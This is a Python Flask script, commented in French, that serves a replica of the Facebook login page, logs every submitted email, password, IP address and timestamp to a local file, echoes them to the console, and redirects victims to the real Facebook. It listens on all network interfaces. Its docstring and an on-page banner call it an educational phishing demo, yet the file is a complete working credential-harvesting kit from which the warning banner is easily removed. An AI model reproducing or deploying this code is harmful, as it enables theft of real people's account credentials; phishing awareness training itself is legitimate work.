#!/usr/bin/env python3
"""
AVERTISSEMENT: SCRIPT À BUT STRICTEMENT ÉDUCATIF
------------------------------------------------
Ce script est développé UNIQUEMENT à des fins d'apprentissage et de sensibilisation
aux techniques de phishing. Son utilisation pour tromper des utilisateurs et collecter
de vrais identifiants est ILLÉGALE et IMMORALE.

Utilisations appropriées:
- Démonstrations de sécurité
- Formation en cybersécurité
- Sensibilisation aux risques de phishing
- Tests autorisés de pénétration

Ce script crée un serveur web local simulant une page de connexion Facebook pour
montrer comment les attaques de phishing fonctionnent techniquement.

L'auteur n'assume aucune responsabilité pour toute utilisation abusive de ce code.
"""

from flask import Flask, request, render_template_string, redirect
import os
import datetime
import argparse
import webbrowser
import socket
import sys

# Template HTML représentant une page similaire à la page de connexion Facebook
# Simplifié pour des raisons éducatives
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connectez-vous ou inscrivez-vous</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Assure que le body prend au moins toute la hauteur de l'écran */
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px; /* Ajoute un peu de marge autour du contenu sur les petits écrans */
            width: 90%; /* Prend 90% de la largeur sur les petits écrans */
            max-width: 450px; /* Limite la largeur maximale sur les grands écrans */
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo h1 {
            color: #1877f2;
            font-size: 48px; /* Augmente la taille du logo */
            margin-bottom: 0;
        }

        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%; /* Prend toute la largeur du conteneur parent */
            margin-bottom: 20px; /* Ajoute de l'espace en dessous du formulaire */
        }

        .login-container h2 {
            color: #1c1e21;
            font-size: 24px; /* Réduit légèrement la taille du titre */
            font-weight: normal;
            margin: 0 0 20px 0;
            text-align: center; /* Centre le titre sur les petits écrans */
        }

        .form-group {
            margin-bottom: 15px;
        }

        input[type="text"],
        input[type="password"] {
            width: calc(100% - 32px); /* Prend toute la largeur moins le padding */
            padding: 14px 16px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px; /* Légèrement plus petit */
            box-sizing: border-box;
        }

        button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 18px; /* Légèrement plus petit */
            font-weight: bold;
            padding: 12px;
            width: 100%;
            cursor: pointer;
        }

        .forgot-password {
            text-align: center;
            margin: 16px 0;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-account {
            text-align: center;
        }

        .create-account button {
            background-color: #42b72a;
            font-size: 16px; /* Légèrement plus petit */
            padding: 10px 16px;
            width: auto;
            margin-top: 10px;
        }

        .phishing-alert {
            background-color: #ffcccc;
            color: #cc0000;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px; /* Légèrement plus petit */
        }

        p {
            font-size: 12px; /* Encore plus petit pour les petits écrans */
            color: #606770;
            text-align: center;
            margin-top: 15px;
        }

        /* Media queries pour les écrans plus petits */
        @media (max-width: 768px) {
            .logo h1 {
                font-size: 36px;
            }
            .login-container h2 {
                font-size: 20px;
            }
        }

        @media (max-width: 480px) {
            .logo h1 {
                font-size: 32px;
            }
            .login-container {
                padding: 15px;
            }
            input[type="text"],
            input[type="password"] {
                padding: 12px 14px;
                font-size: 15px;
            }
            button {
                font-size: 16px;
                padding: 10px;
            }
            .forgot-password a {
                font-size: 13px;
            }
            .create-account button {
                font-size: 15px;
                padding: 8px 14px;
            }
            .phishing-alert {
                font-size: 12px;
            }
            p {
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <h2>Connectez-vous avec Facebook</h2>
        <div class="login-container">
            <form method="post" action="/login">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Adresse e-mail ou numéro de tél.">
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Mot de passe">
                </div>
                <div class="form-group">
                    <button type="submit">Se connecter</button>
                </div>
                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                <div class="divider"></div>
                <div class="create-account">
                    <button type="button">Créer nouveau compte</button>
                </div>
            </form>
        </div>

        <div class="phishing-alert">
            DÉMO ÉDUCATIVE DE PHISHING - NE PAS ENTRER DE VRAIS IDENTIFIANTS
        </div>

        <p>
            Ce site est une démo éducative pour montrer comment fonctionne le phishing.<br>
            Il ne s'agit PAS d'un vrai site Facebook et il ne doit pas être utilisé pour collecter de vrais identifiants.
        </p>
    </div>
</body>
</html>
"""

app = Flask(__name__)

@app.route('/')
def index():
    """Affiche la page de phishing"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    """Capture les identifiants soumis"""
    email = request.form.get('email')
    password = request.form.get('password')
    
    if email and password:
        # Crée le dossier logs s'il n'existe pas
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Enregistre les identifiants capturés avec la date et l'adresse IP
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr
        
        with open('logs/captured_credentials.txt', 'a') as f:
            f.write(f"[{timestamp}] IP: {ip_address}\n")
            f.write(f"Email/Phone: {email}\n")
            f.write(f"Password: {password}\n")
            f.write("-" * 50 + "\n")
        
        print(f"[+] Identifiants capturés de {ip_address}: {email} / {password}")
        sys.stdout.flush()
    
    # Redirige vers le vrai Facebook après la soumission
    return redirect("https://www.facebook.com")

def get_local_ip():
    """Obtient l'adresse IP locale de la machine"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    """Fonction principale"""
    parser = argparse.ArgumentParser(description="Démonstration éducative de phishing Facebook")
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", 8080)), help="Port du serveur web")
    parser.add_argument("--no-browser", action="store_true", help="Ne pas ouvrir automatiquement le navigateur")
    
    args = parser.parse_args()
    
    local_ip = get_local_ip()
    port = args.port
    
    print("!" * 80)
    print("! AVERTISSEMENT: DÉMONSTRATION ÉDUCATIVE DE PHISHING !".center(80))
    print("! NE PAS UTILISER POUR COLLECTER DE VRAIS IDENTIFIANTS !".center(80))
    print("!" * 80 + "\n")
    sys.stdout.flush()
    
    print(f"[*] Démarrage du serveur de phishing éducatif...")
    print(f"[*] Adresse locale   : http://{local_ip}:{port}")
    print(f"[*] Adresse localhost: http://127.0.0.1:{port}")
    print(f"[*] Les identifiants capturés seront enregistrés dans: logs/captured_credentials.txt")
    print("[*] Appuyez sur CTRL+C pour arrêter le serveur\n")
    sys.stdout.flush()
    
    if not args.no_browser:
        print("[*] Ouverture du navigateur...")
        sys.stdout.flush()
        webbrowser.open(f"http://127.0.0.1:{port}")
    
    # Démarre le serveur Flask
    app.run(host="0.0.0.0", port=port, debug=False)

if __name__ == "__main__":
    main()
